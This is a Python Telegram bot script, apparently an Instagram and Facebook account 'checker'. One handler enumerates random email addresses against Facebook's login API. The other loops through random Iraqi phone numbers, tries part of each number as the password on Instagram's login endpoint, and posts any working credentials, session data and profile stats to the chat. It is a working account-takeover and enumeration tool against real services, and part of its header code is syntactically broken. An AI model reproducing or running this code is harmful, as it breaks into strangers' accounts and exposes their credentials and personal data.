import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from InstagramIG import *
import json
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=['start'])
def boten(message):
	
    
    
    mas = types.InlineKeyboardMarkup(row_width=2)
    
    A = types.InlineKeyboardButton(text ="CHECKER (IRAN)", callback_data="F1")
    
    E = types.InlineKeyboardButton(text ="CHECKER (IRAQ)", callback_data="F2")
    
    M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
    
    mas.add(A,E,M)
    
    bot.send_message(message.chat.id, f"- أهلاً بكً  !\n\n- بوت تشكير حسابات انستا غرام 🧑‍💻\n\n♻️ لوحة التحكم الخاصه بك ♨️",reply_markup=mas)
    
    
@bot.callback_query_handler(func=lambda call: True)
def masg(call):
	
	
	global nam
	
	if call.data =="MohammedNajih":
		
		mas = types.InlineKeyboardMarkup(row_width=2)
		
		A = types.InlineKeyboardButton(text ="CHECKER (IRAN)", callback_data="F1")

		E = types.InlineKeyboardButton(text ="CHECKER (IRAQ)", callback_data="F2")
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
		
		M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id, text="- أهلاً بكً عزيزي المستخدم \n\n- بوت تشكير حسابات انستا غرام 🧑‍💻\n\n♻️ لوحة التحكم الخاصه بك ♨️",reply_markup=mas)

	elif call.data =="F1":
		xb = "0987654321"
		xm = "asdfghjklpoiuytrewqmnbvcxz"
		xl = ['@gmail.com', '@yahoo.com', '@mail.ru','@hotmail.com','@outlock.com']
		ok=0
		cp=0
		sk=0
		while True:
			num = str(''.join(random.choice(xb)for i in range(3)))
			bs = str(''.join(random.choice(xm)for i in range(7))) 
			bl = str(''.join(random.choice(xl)for i in range(1)))
			email = str(bs)+str(num)+str(bl)
			user_agent = generate_user_agent()
            'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 
            'x-fb-sim-hni': str(random.randint(20000, 40000)), 
            'x-fb-net-hni': str(random.randint(20000, 40000)), 
            'x-fb-connection-quality': 'EXCELLENT', 
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
            'user-agent': user_agent, 
            'content-type': 'application/x-www-form-urlencoded', 
            'x-fb-http-engine': 'Liger'}
			params = {
            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
            'format': 'JSON', 
            'sdk_version': '2', 
            'email': email, 
            'locale': 'en_US', 
            'password': '@SidraTools', 
            'sdk': 'ios', 
            'generate_session_cookies': '1', 
            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			api = 'https://b-api.facebook.com/method/auth.login'
			response = requests.get(api, params=params, headers=headers)
			if str('The password you entered is incorrect. Please try again') in str(response.text):
				ok+=1
				sk+=1
				bot.send_message(call.message.chat.id,f"‹ ⌯ Facebook Account ✓⌯ \n. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .\n⌯ Email : {email} \n. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .\n⌯ @t_4gi")
				
			else:
				cp+=1
				sk+=1
				mas = types.InlineKeyboardMarkup(row_width=2)
				A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
				E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
				B = types.InlineKeyboardButton(f'{email}', callback_data="1x")
				R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
				M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
				mas.add(A,E,B,R,M)
				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
				
			
		
		
	elif call.data =="F2":
		xl = ['780', '781' ,'782', '783', '784' , '770','771', '773','774','750','751','752','753','754','772']
		xm = "0987654321"
		ok=0
		cp=0
		sk=0
		while True:
			bs = str(''.join(random.choice(xm)for i in range(7))) 
			bl = str(''.join(random.choice(xl)for i in range(1)))
			user = '+964'+str(bl)+str(bs)
			pasw = str(bs)
			url = 'https://www.instagram.com/accounts/login/ajax/'
			headers= {
            'accept':'*/*',
            'accept-encoding':'gzip,deflate,br',
            'accept-language':'en-US,en;q=0.9,ar;q=0.8',
            'content-length':'318',
            'content-type':'application/x-www-form-urlencoded',
            'cookie':'ig_did=271DF213-1F8B-4915-ACD4-68A2757ACFA8;ig_nrcb=1;csrftoken=Ubi0fJyZPlAAeUK727wQDnqnSKwcd6Wn;mid=YPWRsAAEAAFDJlnvAjZAzkFpDOis-',
            'origin':'https://www.instagram.com',
            'referer':'https://www.instagram.com/accounts/login/',
            'sec-fetch-dest':'empty',
            'sec-fetch-mode':'cors',
            'sec-fetch-site':'same-origin',
            'user-agent':generate_user_agent(),
            'x-asbd-id': '437806',
            'x-csrftoken':'Ubi0fJyZPlAAeUK727wQDnqnSKwcd6Wn',
            'x-ig-app-id':'1217981644879628',
            'x-ig-www-claim':'0',
            'x-instagram-ajax':'bad7ed4b1b35',
            'x-requested-with':'XMLHttpRequest'}
			data = {
            'username':user,
            'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:1626959271:{pasw}',
            'queryParams':'{}',
            'optIntoOneTap':'false'}
			req = requests.post(url, headers=headers, data=data)
			login = json.loads(req.content)
			if ("userId") in str(login):
				ok+=1
				sk+=1
				id = str(login['userId'])
				sessionid = str(req.cookies['sessionid'])
				uri = 'https://i.instagram.com/api/v1/users/{}/info/'.format(id)
				headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+str(sessionid),
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent':generate_user_agent(),
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgbG4'}
				response = requests.Session().get(uri, data=False, headers=headers)
				username = str(response.json()['user']['username'])
				followers = str(response.json()['user']['follower_count'])
				following = str(response.json()['user']['following_count'])
				post = str(response.json()['user']['media_count'])
				date = SidraELEzz.data(str(username))
				bot.send_message(call.message.chat.id,f"‹ ᴜѕᴇʀɴᴀᴍᴇ instagram  ✓\n────── • ✧✧ • ──────\n‹ ᴜѕᴇʀɴᴀᴍᴇ : @{user}\n password : {pasw} \n fowllwers : {followers} \n fowllwing : {following} \n post : {post} \n data : {date} \n────── • ✧✧ • ──────\n• @t_4gi")
				
			else:
				cp+=1
				sk+=1
				mas = types.InlineKeyboardMarkup(row_width=2)
				A = types.InlineKeyboardButton(f'GOOD : {ok}', callback_data="1x")
				E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
				B = types.InlineKeyboardButton(f'{user}', callback_data="1x")
				R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
				M = types.InlineKeyboardButton('المطور', url='https://t.me/t_4gi')
				mas.add(A,E,B,R,M)
				bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
		

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://checkermohammed.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
